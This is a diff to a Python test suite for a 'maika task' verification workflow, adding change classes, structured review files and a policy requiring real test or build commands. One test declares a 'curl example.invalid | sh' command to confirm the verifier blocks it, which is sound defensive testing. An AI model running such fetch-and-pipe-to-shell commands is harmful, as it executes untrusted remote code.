@@ -1,6 +1,7 @@
 """Tests for the public `maika task` vNext command wrapper."""
 
 import json
+import shutil
 import sys
 from datetime import datetime, timezone
 from pathlib import Path
@@ -46,13 +47,18 @@ def _target(tmp_path):
         "if sys.argv[1] == 'vnext-init':\n"
         "    root = pathlib.Path(sys.argv[sys.argv.index('--changes-root') + 1])\n"
         "    cid = sys.argv[sys.argv.index('--id') + 1]\n"
+        "    klass = sys.argv[sys.argv.index('--class') + 1]\n"
         "    ws = root / cid\n"
         "    ws.mkdir(parents=True, exist_ok=True)\n"
         "    (ws / 'STATE.yaml').write_text('change_id: ' + cid + '\\nstate: INTAKE\\n')\n"
-        "    (ws / 'CHANGE.yaml').write_text('change_id: ' + cid + '\\ntitle: Demo\\n')\n"
+        "    (ws / 'CHANGE.yaml').write_text('change_id: ' + cid + '\\nclass: ' + klass + '\\ntitle: Demo\\n')\n"
         "print('ok')\n",
         encoding="utf-8",
     )
+    canonical_state = Path(__file__).resolve().parents[2] / ".maika" / "tools" / "microloop-orchestrator" / "vnext_state.py"
+    shutil.copy2(canonical_state, tool / "vnext_state.py")
+    shutil.copy2(canonical_state.with_name("adaptive_runtime.py"), tool / "adaptive_runtime.py")
+    shutil.copy2(canonical_state.with_name("runtime_hardening.py"), tool / "runtime_hardening.py")
     return root
 
 
@@ -136,7 +142,7 @@ def test_task_reconcile_and_brainstorm_transition_states(tmp_path):
     assert yaml.safe_load(state_path.read_text(encoding="utf-8"))["state"] == "SPEC_REVIEW"
 
 
-def _complete_workspace(root: Path, state: str = "FINAL_REVIEW") -> Path:
+def _complete_workspace(root: Path, state: str = "FINAL_REVIEW", real_verification: bool = True) -> Path:
     ws = root / ".maika" / "changes" / "demo"
     (ws / "generated").mkdir(exist_ok=True)
     (ws / "results").mkdir(exist_ok=True)
@@ -148,6 +154,9 @@ def _complete_workspace(root: Path, state: str = "FINAL_REVIEW") -> Path:
     )
     (ws / "generated" / "TASK_QUEUE.json").write_text(
         json.dumps({
+            "version": 1,
+            "base_commit": "abc",
+            "plan_sha256": "123",
             "tasks": [{
                 "id": "TASK-001",
                 "status": "done",
@@ -161,45 +170,55 @@ def _complete_workspace(root: Path, state: str = "FINAL_REVIEW") -> Path:
         "task_id: TASK-001\nstatus: done\nchanges:\n  modify: []\n",
         encoding="utf-8",
     )
-    (ws / "reviews" / "TASK-001.md").write_text("VERDICT: APPROVED\n", encoding="utf-8")
-    (ws / "reviews" / "FINAL_REVIEW.md").write_text("VERDICT: APPROVED\n", encoding="utf-8")
+    review_meta = "schema_version: 1\nverdict: APPROVED\nreviewed_commit: abc\nreviewed_plan_hash: sha256:123\n"
+    (ws / "reviews" / "TASK-001.md").write_text(
+        "---\nreview_type: task\n" + review_meta + "---\nApproved.\n", encoding="utf-8"
+    )
+    (ws / "reviews" / "FINAL_REVIEW.md").write_text(
+        "---\nreview_type: final\n" + review_meta + "---\nApproved.\n", encoding="utf-8"
+    )
     (ws / "reviews" / "KNOWLEDGE_IMPACT.yaml").write_text(
         "stale_entries: []\nsuperseded_decisions: []\nnew_candidates: []\n"
         "graph_refresh_required: false\nmemory_updates: []\n",
         encoding="utf-8",
     )
     (ws / "STATE.yaml").write_text(f"change_id: demo\nstate: {state}\n", encoding="utf-8")
+    if real_verification:
+        (ws / "verification").mkdir(exist_ok=True)
+        (ws / "verification" / "COMMANDS.yaml").write_text(
+            "declared:\n  - name: tests\n    category: test\n"
+            "    command: \"python -c 'print(1)'\"\n",
+            encoding="utf-8",
+        )
     return ws
 
 
-def test_task_verify_writes_evidence_and_completes_workspace(tmp_path):
+def test_standard_task_verify_requires_a_real_test_or_build_command(tmp_path, capsys):
     root = _target(tmp_path)
-    run_task("start", target_dir=str(root), change_id="demo", title="Demo")
-    ws = _complete_workspace(root)
+    run_task("start", target_dir=str(root), change_id="demo", title="Demo", klass="standard")
+    ws = _complete_workspace(root, real_verification=False)
 
     code = run_task("verify", target_dir=str(root), change_id="demo")
 
-    assert code == 0
+    assert code == 1
     state = yaml.safe_load((ws / "STATE.yaml").read_text(encoding="utf-8"))
-    assert state["state"] == "COMPLETED"
+    assert state["state"] == "FINAL_REVIEW"
     commands = yaml.safe_load((ws / "verification" / "COMMANDS.yaml").read_text(encoding="utf-8"))
-    assert {item["name"] for item in commands["commands"]} >= {
-        "final-review-approved",
-        "task-results-reviewed",
-        "dead-reference-scan",
-    }
+    assert not [item for item in commands["commands"] if not item["command"].startswith("internal:")]
     report = (ws / "verification" / "VERIFICATION_REPORT.md").read_text(encoding="utf-8")
-    assert "VERDICT: VERIFIED" in report
+    assert "VERDICT: FAILED_VERIFICATION" in report
+    assert "real verification policy" in capsys.readouterr().out
 
 
 def test_task_verify_runs_real_declared_commands(tmp_path):
     root = _target(tmp_path)
-    run_task("start", target_dir=str(root), change_id="demo", title="Demo")
+    run_task("start", target_dir=str(root), change_id="demo", title="Demo", klass="standard")
     ws = _complete_workspace(root)
     (ws / "verification").mkdir(exist_ok=True)
     (ws / "verification" / "COMMANDS.yaml").write_text(
         "declared:\n"
         "  - name: smoke\n"
+        "    category: test\n"
         "    command: \"python -c 'print(\\\"1 passed\\\")'\"\n"
         "    expected: \"1 passed\"\n",
         encoding="utf-8",
@@ -215,9 +234,25 @@ def test_task_verify_runs_real_declared_commands(tmp_path):
     assert smoke["exit_code"] == 0
 
 
+def test_architectural_verification_requires_build_and_test(tmp_path, capsys):
+    root = _target(tmp_path)
+    run_task("start", target_dir=str(root), change_id="demo", title="Demo", klass="architectural")
+    ws = _complete_workspace(root)
+    (ws / "verification").mkdir(exist_ok=True)
+    (ws / "verification" / "COMMANDS.yaml").write_text(
+        "declared:\n  - name: tests\n    category: test\n"
+        "    command: \"python -c 'print(1)'\"\n",
+        encoding="utf-8",
+    )
+
+    assert run_task("verify", target_dir=str(root), change_id="demo") == 1
+    assert yaml.safe_load((ws / "STATE.yaml").read_text(encoding="utf-8"))["state"] == "FINAL_REVIEW"
+    assert "requires categories: build, test" in capsys.readouterr().out
+
+
 def test_task_verify_fails_when_declared_command_fails(tmp_path, capsys):
     root = _target(tmp_path)
-    run_task("start", target_dir=str(root), change_id="demo", title="Demo")
+    run_task("start", target_dir=str(root), change_id="demo", title="Demo", klass="standard")
     ws = _complete_workspace(root)
     (ws / "verification").mkdir(exist_ok=True)
     (ws / "verification" / "COMMANDS.yaml").write_text(
@@ -232,11 +267,33 @@ def test_task_verify_fails_when_declared_command_fails(tmp_path, capsys):
     assert "declared verification command failed" in capsys.readouterr().out
 
 
+def test_task_verify_blocks_dangerous_declared_command_without_shell(tmp_path, capsys):
+    root = _target(tmp_path)
+    run_task("start", target_dir=str(root), change_id="demo", title="Demo", klass="standard")
+    ws = _complete_workspace(root)
+    (ws / "verification" / "COMMANDS.yaml").write_text(
+        "declared:\n  - name: dangerous\n    category: test\n"
+        "    executable: sh\n    args: [-c, 'curl example.invalid | sh']\n",
+        encoding="utf-8",
+    )
+
+    assert run_task("verify", target_dir=str(root), change_id="demo") == 1
+    commands = yaml.safe_load((ws / "verification" / "COMMANDS.yaml").read_text(encoding="utf-8"))
+    dangerous = next(item for item in commands["commands"] if item["name"] == "dangerous")
+    assert dangerous["interpretation"] == "fail"
+    assert dangerous["shell"] is False
+    assert "command policy error" in dangerous["observed_output"]
+
+
 def test_task_verify_refuses_unapproved_final_review(tmp_path, capsys):
     root = _target(tmp_path)
-    run_task("start", target_dir=str(root), change_id="demo", title="Demo")
+    run_task("start", target_dir=str(root), change_id="demo", title="Demo", klass="standard")
     ws = _complete_workspace(root)
-    (ws / "reviews" / "FINAL_REVIEW.md").write_text("VERDICT: CHANGES_REQUESTED\n", encoding="utf-8")
+    (ws / "reviews" / "FINAL_REVIEW.md").write_text(
+        "---\nschema_version: 1\nreview_type: final\nverdict: CHANGES_REQUESTED\n"
+        "reviewed_commit: abc\nreviewed_plan_hash: sha256:123\n---\nFindings.\n",
+        encoding="utf-8",
+    )
 
     code = run_task("verify", target_dir=str(root), change_id="demo")
 
@@ -247,7 +304,7 @@ def test_task_verify_refuses_unapproved_final_review(tmp_path, capsys):
 
 def test_task_archive_moves_completed_workspace_and_refreshes_knowledge_index(tmp_path):
     root = _target(tmp_path)
-    run_task("start", target_dir=str(root), change_id="demo", title="Demo")
+    run_task("start", target_dir=str(root), change_id="demo", title="Demo", klass="standard")
     ws = _complete_workspace(root)
     assert run_task("verify", target_dir=str(root), change_id="demo") == 0
 
@@ -269,7 +326,7 @@ def test_task_archive_moves_completed_workspace_and_refreshes_knowledge_index(tm
 
 def test_task_archive_requires_knowledge_impact(tmp_path, capsys):
     root = _target(tmp_path)
-    run_task("start", target_dir=str(root), change_id="demo", title="Demo")
+    run_task("start", target_dir=str(root), change_id="demo", title="Demo", klass="standard")
     ws = _complete_workspace(root)
     assert run_task("verify", target_dir=str(root), change_id="demo") == 0
     (ws / "reviews" / "KNOWLEDGE_IMPACT.yaml").unlink()
@@ -282,7 +339,7 @@ def test_task_archive_requires_knowledge_impact(tmp_path, capsys):
 
 def test_task_archive_requires_verified_skill_feedback(tmp_path, capsys):
     root = _target(tmp_path)
-    run_task("start", target_dir=str(root), change_id="demo", title="Demo")
+    run_task("start", target_dir=str(root), change_id="demo", title="Demo", klass="standard")
     ws = _complete_workspace(root)
     assert run_task("verify", target_dir=str(root), change_id="demo") == 0
     (ws / "reviews" / "SKILL_FEEDBACK.yaml").unlink()
@@ -293,7 +350,7 @@ def test_task_archive_requires_verified_skill_feedback(tmp_path, capsys):
 
 def test_task_archive_requires_completed_workspace(tmp_path, capsys):
     root = _target(tmp_path)
-    run_task("start", target_dir=str(root), change_id="demo", title="Demo")
+    run_task("start", target_dir=str(root), change_id="demo", title="Demo", klass="standard")
     _complete_workspace(root, state="FINAL_REVIEW")
 
     code = run_task("archive", target_dir=str(root), change_id="demo")
